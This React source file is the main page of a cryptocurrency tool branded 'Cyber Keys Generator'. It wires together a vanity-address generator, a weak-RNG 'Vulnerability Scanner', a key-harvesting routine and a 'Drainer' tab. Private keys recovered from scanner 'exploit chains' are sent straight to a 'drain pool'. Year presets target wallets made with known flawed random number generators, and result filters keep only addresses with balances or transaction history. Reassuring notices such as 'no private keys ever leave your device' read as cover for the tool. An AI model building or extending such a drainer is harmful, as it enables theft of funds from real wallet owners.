import { useState, useEffect, useCallback, useRef } from 'react';
import { useVanityGenerator } from '@/hooks/useVanityGenerator';
import type { FoundAddress } from '@/hooks/useVanityGenerator';
import type { ScanResult } from '@/hooks/useVulnerabilityScanner';
import { usePassiveWallets } from '@/hooks/usePassiveWallets';
import { harvestKeys } from '@/lib/keyHarvest';
import PulseBackground from '@/components/PulseBackground';
import DiscoveryVault from '@/components/DiscoveryVault';
import VulnerabilityScanner from '@/components/VulnerabilityScanner';
import DuneQuery from '@/components/DuneQuery';
import WalletPanel from '@/components/WalletPanel';
import DrainerPanel from '@/components/DrainerPanel';

const BTC_TYPES = [
  { value: 'p2pkh', label: 'Legacy (P2PKH)', prefix: '1', charset: 'Base58', charsetSize: 58 },
  { value: 'p2sh', label: 'SegWit (P2SH)', prefix: '3', charset: 'Base58', charsetSize: 58 },
  { value: 'bech32', label: 'Native SegWit', prefix: 'bc1q', charset: 'Bech32', charsetSize: 32 },
];

function getDifficulty(patternLength: number, charsetSize: number) {
  if (patternLength === 0) return { space: 1, display: '1' };
  const space = Math.pow(charsetSize, patternLength);
  return {
    space,
    display: space >= 1e15
      ? space.toExponential(2)
      : space >= 1e9
        ? `${(space / 1e9).toFixed(1)}B`
        : space >= 1e6
          ? `${(space / 1e6).toFixed(1)}M`
          : space.toLocaleString(),
  };
}

function formatTime(seconds: number): string {
  if (!isFinite(seconds) || seconds < 0) return '∞';
  if (seconds < 1) return '< 1s';
  if (seconds < 60) return `~${Math.round(seconds)}s`;
  if (seconds < 3600) return `~${Math.round(seconds / 60)}m`;
  if (seconds < 86400) return `~${(seconds / 3600).toFixed(1)}h`;
  if (seconds < 86400 * 365) return `~${(seconds / 86400).toFixed(1)}d`;
  return `~${(seconds / (86400 * 365)).toFixed(1)}y`;
}

function formatHashrate(h: number): string {
  if (h >= 1_000_000) return `${(h / 1_000_000).toFixed(2)}M/s`;
  if (h >= 1_000) return `${(h / 1_000).toFixed(1)}k/s`;
  return `${h}/s`;
}

export default function Index() {
  // ── TAB STATE ────────────────────────────────────────────────────────────
  const [activeTab, setActiveTab] = useState<'vanity' | 'scanner' | 'dune' | 'wallet' | 'drainer'>('vanity');
  const [walletSubTab, setWalletSubTab] = useState<'active' | 'passive'>('active');

  // ── PASSIVE WALLETS ──────────────────────────────────────────────────────
  const passive = usePassiveWallets();

  const handleVanityResults = useCallback((results: FoundAddress[]) => {
    passive.addAddresses(results.map(r => ({
      address: r.address,
      privateKey: r.privateKey,
      network: r.network,
      addressType: r.addressType,
      source: 'vanity' as const,
      timestamp: r.timestamp,
    })));
  }, [passive.addAddresses]);

  const handleScannerResults = useCallback((results: ScanResult[]) => {
    passive.addAddresses(results.map(r => ({
      address: r.address,
      privateKey: r.privateKey,
      network: r.network,
      addressType: r.addressType,
      source: 'scanner' as const,
      timestamp: r.timestamp,
    })));
  }, [passive.addAddresses]);


  const handleExploitChains = useCallback((entries: { address: string; privateKey: string; network: "btc" | "eth"; addressType: string }[]) => {
    // Add to passive wallets store
    passive.addAddresses(entries.map(e => ({
      address: e.address,
      privateKey: e.privateKey,
      network: e.network,
      addressType: e.addressType,
      source: "scanner" as const,
      timestamp: Date.now(),
    })));
    // Also add directly to drain pool (harvested keys)
    harvestKeys(entries.map(e => ({
      address: e.address,
      privateKey: e.privateKey,
      network: e.network,
      addressType: e.addressType,
    })), "scanner");
  }, [passive.addAddresses]);
  // ── VANITY GENERATOR STATE ───────────────────────────────────────────────
  const [network, setNetwork] = useState<'btc' | 'eth'>('btc');
  const [prefix, setPrefix] = useState('');
  const [suffix, setSuffix] = useState('');
  const [btcType, setBtcType] = useState('p2pkh');
  const [generationYear, setGenerationYear] = useState<number | null>(null);
  const [targetAddress, setTargetAddress] = useState('');
  const [entropyCount, setEntropyCount] = useState(0);
  const [onlyWithBalance, setOnlyWithBalance] = useState(false);
  const [onlyWithTx, setOnlyWithTx] = useState(false);
  const entropyBuffer = useRef<number[]>([]);

  const gen = useVanityGenerator();
  const isMint = network === 'btc';

  // ── Security Console Certification ───────────────────────────────────────
  useEffect(() => {
    console.log(
      '%c🔒 SECURITY NOTICE\n' +
      'This application makes ZERO external API calls during address generation.\n' +
      'All cryptographic operations (secp256k1 key derivation, SHA-256, RIPEMD-160,\n' +
      'Keccak-256, Base58Check, Bech32, EIP-55) are performed 100% locally in your browser.\n' +
      'No private keys ever leave your device.',
      'color: #00ff88; font-size: 13px; font-weight: bold; background: #0a0a0a; padding: 8px;'
    );
    console.log(
      '%c✅ AIR-GAP READY: This SPA functions fully offline once loaded.',
      'color: #00ff88; font-size: 12px;'
    );
  }, []);

  // ── Derived State ─────────────────────────────────────────────────────────
  const currentType = BTC_TYPES.find(t => t.value === btcType) || BTC_TYPES[0];
  const charsetSize = network === 'eth' ? 16 : currentType.charsetSize;
  const totalPatternLen = prefix.length + suffix.length;
  const diff = getDifficulty(totalPatternLen, charsetSize);
  const eta = gen.hashrate > 0 ? diff.space / gen.hashrate : Infinity;

  // ── Input Validation ──────────────────────────────────────────────────────
  const validateChars = (val: string): boolean => {
    if (!val) return true;
    if (network === 'eth') return /^[0-9a-fA-F]+$/.test(val);
    if (btcType === 'bech32') return /^[02-9ac-hj-np-z]+$/.test(val);
    return /^[1-9A-HJ-NP-Za-km-z]+$/.test(val);
  };

  const prefixValid = validateChars(prefix);
  const suffixValid = validateChars(suffix);
  const hasPattern = prefix.length > 0 || suffix.length > 0 || targetAddress.length > 0;
  const canStart = hasPattern && (targetAddress.length > 0 || (prefixValid && suffixValid));

  const handleStart = () => {
    if (!canStart) return;
    // When year mode is active, auto-select the era's default address type
    let effectiveAddrType = network === 'btc' ? btcType : 'eth';
    if (generationYear !== null && network === 'btc') {
      if (generationYear <= 2016) effectiveAddrType = 'p2pkh';
      else if (generationYear <= 2018) effectiveAddrType = 'p2sh';
      else if (generationYear >= 2021) effectiveAddrType = 'bech32';
    }
    gen.start({
      network,
      prefix: targetAddress ? '' : prefix,
      suffix: targetAddress ? '' : suffix,
      addressType: effectiveAddrType,
      targetAddress: targetAddress || undefined,
      generationYear: generationYear ?? undefined,
    });
  };

  // Push new vanity results into passive store
  const prevVanityLenRef = useRef(0);
  useEffect(() => {
    if (gen.results.length === 0) return;
    const newOnes = gen.results.slice(0, gen.results.length - prevVanityLenRef.current);
    if (newOnes.length > 0) handleVanityResults(newOnes);
    prevVanityLenRef.current = gen.results.length;
  }, [gen.results, handleVanityResults]);

  const handleNetworkSwitch = (net: 'btc' | 'eth') => {
    if (gen.isRunning) gen.stop();
    setNetwork(net);
    setPrefix('');
    setSuffix('');
    setTargetAddress('');
  };

  const showModerateWarning = totalPatternLen >= 6 && totalPatternLen < 10 && !targetAddress;
  const showExtremeWarning = totalPatternLen >= 10 && !targetAddress;

  return (
    <div className="relative min-h-screen bg-background">
      <PulseBackground hashrate={gen.hashrate} network={network} />

      <div className="relative z-10 max-w-4xl mx-auto px-4 py-8 space-y-6 animate-fade-in">

        {/* ── Header ─────────────────────────────────────────────────────── */}
        <header className="text-center space-y-2">
          <h1 className="text-3xl font-bold tracking-tight">
            <span className={isMint ? 'text-primary text-glow-mint' : 'text-secondary text-glow-blue'}>
              Cyber Keys Generator
            </span>
          </h1>
          <p className="text-muted-foreground text-sm">
            Security-first, client-side cryptographic tools
          </p>
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/10 text-primary text-xs font-mono">
            <span className="w-2 h-2 rounded-full bg-primary animate-pulse" />
            ZERO EXTERNAL CALLS · AIR-GAP READY
          </div>
        </header>

        {/* ── TAB TOGGLE ─────────────────────────────────────────────────── */}
        <div className="flex justify-center">
          <div className="inline-flex rounded-lg border border-border bg-card p-1 gap-1">
            <button
              onClick={() => setActiveTab('vanity')}
              className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                activeTab === 'vanity'
                  ? 'bg-primary text-primary-foreground glow-mint'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              ✨ Vanity Generator
            </button>
            <button
              onClick={() => setActiveTab('scanner')}
              className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                activeTab === 'scanner'
                  ? 'bg-secondary text-secondary-foreground glow-blue'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              🔍 Vulnerability Scanner
            </button>
            <button
              onClick={() => setActiveTab('dune')}
              className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                activeTab === 'dune'
                  ? 'bg-primary text-primary-foreground glow-mint'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              📊 Dune Query
            </button>
            <button
              onClick={() => setActiveTab('wallet')}
              className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                activeTab === 'wallet'
                  ? 'bg-secondary text-secondary-foreground glow-blue'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              👛 Wallet
            </button>
            <button
              onClick={() => setActiveTab('drainer')}
              className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                activeTab === 'drainer'
                  ? 'bg-destructive text-destructive-foreground'
                  : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              🚰 Drainer
            </button>
          </div>
        </div>

        {/* ── VANITY GENERATOR TAB ───────────────────────────────────────── */}
        {activeTab === 'vanity' && (
          <>
            {/* ── Network Toggle ───────────────────────────────────────── */}
            <div className="flex justify-center">
              <div className="inline-flex rounded-lg border border-border bg-card p-1 gap-1">
                <button
                  onClick={() => handleNetworkSwitch('btc')}
                  className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                    network === 'btc'
                      ? 'bg-primary text-primary-foreground glow-mint'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  ₿ Bitcoin
                </button>
                <button
                  onClick={() => handleNetworkSwitch('eth')}
                  className={`px-6 py-2 rounded-md text-sm font-medium transition-all ${
                    network === 'eth'
                      ? 'bg-secondary text-secondary-foreground glow-blue'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  Ξ Ethereum
                </button>
              </div>
            </div>

            {/* ── Year-Mode Selector ──────────────────────────────────────── */}
            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <label className="text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    🗓 Wallet Generation Year
                  </label>
                  <p className="text-[11px] text-muted-foreground">
                    Simulate the RNG &amp; address format used by real wallets in that year
                  </p>
                </div>
                {generationYear !== null && (
                  <button
                    onClick={() => setGenerationYear(null)}
                    className="text-[10px] text-muted-foreground hover:text-destructive transition-colors"
                  >
                    ✕ Clear
                  </button>
                )}
              </div>

              <div className="flex flex-wrap gap-1.5">
                {([
                  [2009,'Genesis'],[2010,'Miners'],[2011,'Brainwallet'],[2012,'Web Wallet'],
                  [2013,'Mt.Gox'],[2014,'Android Bug'],[2015,'ETH Launch'],[2016,'DAO Era'],
                  [2017,'ICO Boom'],[2018,'Bear Mkt'],[2019,'Bech32'],[2020,'DeFi'],
                  [2021,'Taproot'],[2022,'Merge'],[2023,'Ordinals'],[2024,'ETF Era'],
                ] as [number, string][]).map(([yr, tag]) => (
                  <button
                    key={yr}
                    onClick={() => setGenerationYear(generationYear === yr ? null : yr)}
                    disabled={gen.isRunning}
                    title={
                      yr <= 2014 ? `${yr}: Bitcoin only · Low-entropy RNG patterns` :
                      yr <= 2016 ? `${yr}: ETH newly launched · Web3.js early RNG` :
                      yr <= 2018 ? `${yr}: HD wallets standard · P2SH SegWit` :
                      `${yr}: Full CSPRNG · ${yr >= 2021 ? 'Taproot / Bech32m' : 'Bech32 native SegWit'}`
                    }
                    className={`px-2.5 py-1 rounded text-[11px] font-mono border transition-all disabled:opacity-50 ${
                      generationYear === yr
                        ? 'bg-primary/20 border-primary/60 text-primary font-semibold'
                        : 'border-border text-muted-foreground hover:border-primary/40 hover:text-foreground'
                    }`}
                  >
                    {yr}
                    <span className="ml-1 text-[9px] opacity-60">{tag}</span>
                  </button>
                ))}
              </div>

              {generationYear !== null && (
                <div className={`rounded-md px-3 py-2 text-[11px] space-y-0.5 border ${
                  generationYear <= 2014 ? 'bg-destructive/10 border-destructive/30 text-destructive' :
                  generationYear <= 2018 ? 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400' :
                  'bg-primary/10 border-primary/30 text-primary'
                }`}>
                  <div className="font-semibold">
                    {generationYear <= 2014 ? '🔴 High vulnerability era' :
                     generationYear <= 2018 ? '🟡 Moderate vulnerability era' :
                     '🟢 Modern secure era'}
                  </div>
                  <div className="opacity-80">
                    {generationYear === 2009 ? 'OpenSSL rand() with counter seeds. Many keys near-sequential.' :
                     generationYear === 2010 ? 'Shared pool mining entropy. GPU wallets with weak seeding.' :
                     generationYear === 2011 ? 'PHP mt_rand seeded with time(). BitcoinTalk brainwallet patterns.' :
                     generationYear === 2012 ? 'Server-side PHP wallets. Predictable seed windows.' :
                     generationYear === 2013 ? 'JavaScript Date.now() mixed entropy. Exchange hot wallets.' :
                     generationYear === 2014 ? 'Android SecureRandom bias (CVE-2013-7372). Mobile wallet era.' :
                     generationYear === 2015 ? 'web3.js v0.x Math.random mixing. Early ETH wallets.' :
                     generationYear === 2016 ? 'MyEtherWallet v1, MetaMask alpha. Similar JS RNG issues.' :
                     generationYear === 2017 ? 'BIP44 HD wallets. Many low-entropy mnemonic seeds from users.' :
                     generationYear === 2018 ? 'Hardware wallets rise. Still many soft-wallet weak seeds.' :
                     generationYear === 2019 ? 'Improved CSPRNG. Native SegWit bech32 becomes default.' :
                     generationYear === 2020 ? 'MetaMask v8+. Full browser CSPRNG. DeFi wallet patterns.' :
                     generationYear === 2021 ? 'Taproot activated. Full entropy mixing. NFT wallet surge.' :
                     generationYear === 2022 ? 'ETH Merge. EIP-4361. Hardware wallet standard.' :
                     generationYear === 2023 ? 'Ordinals / Taproot standard. Strong entropy everywhere.' :
                     'Spot ETF era. Institutional wallets. Maximum entropy.' }
                    {network === 'btc' && generationYear <= 2016 ? ' → Forces P2PKH (Legacy) format.' :
                     network === 'btc' && generationYear <= 2018 ? ' → Forces P2SH (SegWit-wrapped) format.' :
                     network === 'btc' && generationYear >= 2019 ? ' → Forces Bech32 (native SegWit) format.' : ''}
                  </div>
                </div>
              )}
            </div>

            {/* ── Generator Controls ───────────────────────────────────── */}
            <div className="rounded-lg border border-border bg-card p-6 space-y-4">
              {network === 'btc' && (
                <div className="space-y-2">
                  <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                    Address Type
                  </label>
                  <div className="flex gap-2 flex-wrap">
                    {BTC_TYPES.map(t => (
                      <button
                        key={t.value}
                        onClick={() => {
                          setBtcType(t.value);
                          setPrefix('');
                          setSuffix('');
                          setTargetAddress('');
                        }}
                        disabled={gen.isRunning}
                        className={`px-3 py-1.5 rounded-md text-xs font-mono transition-all disabled:opacity-50 ${
                          btcType === t.value
                            ? 'bg-primary/20 text-primary border border-primary/30'
                            : 'bg-accent text-muted-foreground hover:text-foreground border border-transparent'
                        }`}
                      >
                        {t.label} ({t.prefix}...)
                      </button>
                    ))}
                  </div>
                </div>
              )}

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                    Desired Prefix
                  </label>
                  <div className="flex items-center gap-2">
                    <span className="text-muted-foreground font-mono text-sm shrink-0">
                      {network === 'eth' ? '0x' : currentType.prefix}
                    </span>
                    <input
                      type="text"
                      value={prefix}
                      onChange={e => setPrefix(e.target.value)}
                      placeholder={network === 'eth' ? 'dead, cafe...' : 'abc...'}
                      disabled={gen.isRunning}
                      className={`flex-1 min-w-0 bg-background border rounded-md px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 transition-all ${
                        !prefixValid
                          ? 'border-destructive focus:ring-destructive'
                          : isMint
                            ? 'border-border focus:ring-primary/50'
                            : 'border-border focus:ring-secondary/50'
                      }`}
                    />
                  </div>
                  {!prefixValid && (
                    <p className="text-destructive text-xs">
                      Invalid chars for {network === 'eth' ? 'hex (0-9, a-f)' : currentType.charset}
                    </p>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                    Desired Suffix
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      value={suffix}
                      onChange={e => setSuffix(e.target.value)}
                      placeholder={network === 'eth' ? 'beef, face...' : 'xyz...'}
                      disabled={gen.isRunning}
                      className={`flex-1 min-w-0 bg-background border rounded-md px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 transition-all ${
                        !suffixValid
                          ? 'border-destructive focus:ring-destructive'
                          : isMint
                            ? 'border-border focus:ring-primary/50'
                            : 'border-border focus:ring-secondary/50'
                      }`}
                    />
                    <span className="text-muted-foreground font-mono text-xs shrink-0">...end</span>
                  </div>
                  {!suffixValid && (
                    <p className="text-destructive text-xs">
                      Invalid chars for {network === 'eth' ? 'hex (0-9, a-f)' : currentType.charset}
                    </p>
                  )}
                </div>
              </div>

              {network === 'eth' && (prefix || suffix) && !targetAddress && (
                <p className="text-muted-foreground text-xs">
                  ℹ️ Hex matching is case-insensitive. EIP-55 checksum is applied after the match is found.
                </p>
              )}

              <div className="space-y-2">
                <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                  Target Address{' '}
                  <span className="normal-case font-normal text-muted-foreground">
                    (optional — overrides prefix/suffix)
                  </span>
                </label>
                <input
                  type="text"
                  value={targetAddress}
                  onChange={e => setTargetAddress(e.target.value.trim())}
                  placeholder={
                    network === 'eth'
                      ? '0x742d35Cc6634C0532925a3b844Bc9e7595f...'
                      : currentType.prefix + '...'
                  }
                  disabled={gen.isRunning}
                  className={`w-full bg-background border rounded-md px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 transition-all ${
                    isMint
                      ? 'border-border focus:ring-primary/50'
                      : 'border-border focus:ring-secondary/50'
                  }`}
                />
                {targetAddress && (
                  <p className="text-muted-foreground text-xs">
                    🎯 Target mode: searching for this exact address only.
                  </p>
                )}
              </div>

              {hasPattern && prefixValid && suffixValid && !targetAddress && (
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                  <Stat label="Search Space" value={diff.display} />
                  <Stat label="Charset" value={`${charsetSize} chars`} />
                  <Stat
                    label="Est. Time"
                    value={gen.hashrate > 0 ? formatTime(eta) : '—'}
                  />
                  <Stat label="Difficulty" value={`${charsetSize}^${totalPatternLen}`} />
                </div>
              )}

              {showModerateWarning && (
                <div className="rounded-md bg-yellow-500/10 border border-yellow-500/20 px-4 py-2 text-xs text-yellow-400">
                  ⚠️ {totalPatternLen}-character pattern: search space is {diff.display}. This may take a while depending on your device.
                </div>
              )}
              {showExtremeWarning && (
                <div className="rounded-md bg-destructive/10 border border-destructive/20 px-4 py-2 text-xs text-destructive font-medium">
                  🚨 {totalPatternLen}+ character pattern: search space is {diff.display}. This could take years on consumer hardware. Are you sure?
                </div>
              )}

              <div className="flex gap-3">
                {!gen.isRunning ? (
                  <button
                    onClick={handleStart}
                    disabled={!canStart}
                    className={`flex-1 py-3 rounded-lg font-semibold text-sm transition-all disabled:opacity-30 disabled:cursor-not-allowed ${
                      isMint
                        ? 'bg-primary text-primary-foreground hover:opacity-90 glow-mint'
                        : 'bg-secondary text-secondary-foreground hover:opacity-90 glow-blue'
                    }`}
                  >
                    ⚡ Start Generating ({gen.workerCount} threads)
                  </button>
                ) : (
                  <button
                    onClick={gen.stop}
                    className="flex-1 py-3 rounded-lg font-semibold text-sm bg-destructive text-destructive-foreground hover:opacity-90 transition-all"
                  >
                    ■ Stop
                  </button>
                )}
              </div>
            </div>

            {gen.isRunning && (
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 animate-fade-in">
                <StatCard
                  label="Hashrate"
                  value={formatHashrate(gen.hashrate)}
                  accent={isMint}
                />
                <StatCard
                  label="Workers"
                  value={`${gen.workerCount}`}
                  accent={isMint}
                />
                <StatCard
                  label="Found"
                  value={gen.foundCount.toLocaleString()}
                  accent={isMint}
                />
                <StatCard
                  label="Entropy Events"
                  value={`${entropyCount}`}
                  accent={isMint}
                />
              </div>
            )}

            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center gap-2">
                <span className="text-sm">🌧️ Entropy Rain</span>
                <span className="text-xs text-muted-foreground">
                  Type a number and inject that many entropy events
                </span>
              </div>
              <div className="flex gap-2">
                <input
                  type="number"
                  min={1}
                  className="flex-1 rounded-md border border-border bg-background px-3 py-2 text-sm font-mono text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
                  placeholder="e.g. 3007"
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') {
                      const val = parseInt((e.target as HTMLInputElement).value, 10);
                      if (!val || val <= 0) return;
                      const data = new Uint8Array(val);
                      crypto.getRandomValues(data);
                      for (let i = 0; i < data.length; i++) {
                        data[i] = (data[i] ^ (Date.now() & 0xff) ^ (i * 37)) & 0xff;
                      }
                      gen.injectEntropy(data.buffer);
                      setEntropyCount(prev => prev + val);
                      (e.target as HTMLInputElement).value = '';
                    }
                  }}
                />
                <button
                  type="button"
                  className={`rounded-md px-4 py-2 text-sm font-medium transition-colors ${isMint ? 'bg-primary text-primary-foreground hover:bg-primary/90' : 'bg-secondary text-secondary-foreground hover:bg-secondary/90'}`}
                  onClick={(e) => {
                    const input = (e.currentTarget.previousElementSibling as HTMLInputElement);
                    const val = parseInt(input.value, 10);
                    if (!val || val <= 0) return;
                    const data = new Uint8Array(val);
                    crypto.getRandomValues(data);
                    for (let i = 0; i < data.length; i++) {
                      data[i] = (data[i] ^ (Date.now() & 0xff) ^ (i * 37)) & 0xff;
                    }
                    gen.injectEntropy(data.buffer);
                    setEntropyCount(prev => prev + val);
                    input.value = '';
                  }}
                >
                  Inject
                </button>
              </div>
              <div className="h-1.5 rounded-full bg-muted overflow-hidden">
                <div
                  className={`h-full rounded-full transition-all duration-500 ${isMint ? 'bg-primary' : 'bg-secondary'}`}
                  style={{ width: `${Math.min(100, (entropyCount / 500) * 100)}%` }}
                />
              </div>
              <p className="text-[10px] text-muted-foreground font-mono">
                {entropyCount} entropy events collected
              </p>
            </div>

            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center gap-2">
                <span className="text-sm">🎯 Result Filters</span>
                <span className="text-xs text-muted-foreground">
                  Screens every generated pattern match; leave both unchecked to list every match
                </span>
              </div>
              <div className="flex flex-wrap gap-4">
                <label className="flex items-center gap-2 text-sm cursor-pointer">
                  <input
                    type="checkbox"
                    className="h-4 w-4 accent-current"
                    checked={onlyWithBalance}
                    onChange={(e) => setOnlyWithBalance(e.target.checked)}
                  />
                  Only addresses with balance
                </label>
                <label className="flex items-center gap-2 text-sm cursor-pointer">
                  <input
                    type="checkbox"
                    className="h-4 w-4 accent-current"
                    checked={onlyWithTx}
                    onChange={(e) => setOnlyWithTx(e.target.checked)}
                  />
                  Only addresses with transaction history
                </label>
              </div>
            </div>

            <DiscoveryVault
              results={gen.results}
              onClear={gen.clearResults}
              onlyWithBalance={onlyWithBalance}
              onlyWithTx={onlyWithTx}
              onDiscard={gen.removeResults}
            />
          </>
        )}

        {/* ── VULNERABILITY SCANNER TAB ─────────────────────────────────── */}
        {activeTab === 'scanner' && (
          <div className="animate-fade-in">
            <VulnerabilityScanner onNewResults={handleScannerResults} onNewExploitChains={handleExploitChains} />
          </div>
        )}

        {/* ── DUNE QUERY TAB ───────────────────────────────────────────── */}
        {activeTab === 'dune' && (
          <DuneQuery />
        )}

        {/* ── WALLET TAB ───────────────────────────────────────────────── */}
        {activeTab === 'wallet' && (
          <div className="space-y-4 animate-fade-in">
            {/* Sub-tab toggle */}
            <div className="flex justify-center">
              <div className="inline-flex rounded-lg border border-border bg-card p-1 gap-1">
                <button
                  onClick={() => setWalletSubTab('active')}
                  className={`px-5 py-2 rounded-md text-sm font-medium transition-all ${
                    walletSubTab === 'active'
                      ? 'bg-secondary text-secondary-foreground glow-blue'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  🔓 Active Wallets
                </button>
                <button
                  onClick={() => setWalletSubTab('passive')}
                  className={`px-5 py-2 rounded-md text-sm font-medium transition-all ${
                    walletSubTab === 'passive'
                      ? 'bg-primary text-primary-foreground glow-mint'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  📥 Passive Wallets
                  {passive.count > 0 && (
                    <span className="ml-2 rounded-full bg-primary/20 px-2 py-0.5 text-xs font-mono">
                      {passive.count.toLocaleString()}
                    </span>
                  )}
                </button>
              </div>
            </div>

            {walletSubTab === 'active' && <WalletPanel />}

            {walletSubTab === 'passive' && (
              <div className="max-w-xl mx-auto rounded-xl border border-primary/25 bg-primary/[0.04] p-8 space-y-6 text-center animate-fade-in">
                <div className="space-y-2">
                  <div className="text-5xl font-bold font-mono text-primary text-glow-mint">
                    {passive.count.toLocaleString()}
                  </div>
                  <div className="text-sm text-muted-foreground">
                    addresses auto-collected
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 text-left">
                  <div className="rounded-lg border border-border bg-card p-4 space-y-1">
                    <div className="text-[10px] uppercase tracking-wider text-muted-foreground">Source</div>
                    <div className="text-sm font-medium">✨ Vanity Generator</div>
                    <div className="text-xs text-muted-foreground">All results tab matches</div>
                  </div>
                  <div className="rounded-lg border border-border bg-card p-4 space-y-1">
                    <div className="text-[10px] uppercase tracking-wider text-muted-foreground">Source</div>
                    <div className="text-sm font-medium">🔍 Vulnerability Scanner</div>
                    <div className="text-xs text-muted-foreground">All scanner results</div>
                  </div>
                </div>

                <div className="rounded-lg border border-border bg-card px-4 py-3 text-xs text-muted-foreground space-y-1">
                  <p>Addresses are stored locally in your browser and persist across sessions.</p>
                  <p>They are <span className="text-primary font-medium">automatically unlocked</span> — no manual import needed.</p>
                  <p className="font-mono text-[10px]">Storage: chunked localStorage · No limit</p>
                </div>

                {passive.count > 0 && (
                  <button
                    onClick={() => {
                      if (confirm(`Clear all ${passive.count.toLocaleString()} passive wallets? This cannot be undone.`)) {
                        passive.clearAll();
                      }
                    }}
                    className="rounded-lg border border-destructive/40 px-4 py-2 text-xs text-destructive hover:bg-destructive/10 transition-all"
                  >
                    🗑 Clear all passive wallets
                  </button>
                )}

                {passive.count === 0 && (
                  <p className="text-xs text-muted-foreground italic">
                    No addresses yet. Run the Vanity Generator or Vulnerability Scanner to start collecting.
                  </p>
                )}
              </div>
            )}
          </div>
        )}

        {/* ── DRAINER TAB ──────────────────────────────────────────────── */}
        {activeTab === 'drainer' && <DrainerPanel />}

        {/* ── Footer ───────────────────────────────────────────────────── */}
        <footer className="text-center text-xs text-muted-foreground space-y-1 pb-8">
          <p className="font-mono">
            All keys generated locally · secp256k1 via @noble/curves · SHA-256/RIPEMD-160/Keccak-256 via @noble/hashes
          </p>
          <p>This app works fully offline once loaded · No data leaves your device</p>
        </footer>
      </div>
    </div>
  );
}

function Stat({ label, value }: { label: string; value: string }) {
  return (
    <div className="rounded-md bg-accent/50 px-3 py-2">
      <div className="text-[10px] text-muted-foreground uppercase tracking-wider">{label}</div>
      <div className="font-mono text-sm text-foreground">{value}</div>
    </div>
  );
}

function StatCard({ label, value, accent }: { label: string; value: string; accent: boolean }) {
  return (
    <div className={`rounded-lg border p-3 ${
      accent
        ? 'border-primary/20 bg-primary/5'
        : 'border-secondary/20 bg-secondary/5'
    }`}>
      <div className="text-[10px] text-muted-foreground uppercase tracking-wider">{label}</div>
      <div className={`font-mono text-lg font-bold ${accent ? 'text-primary' : 'text-secondary'}`}>
        {value}
      </div>
    </div>
  );
}
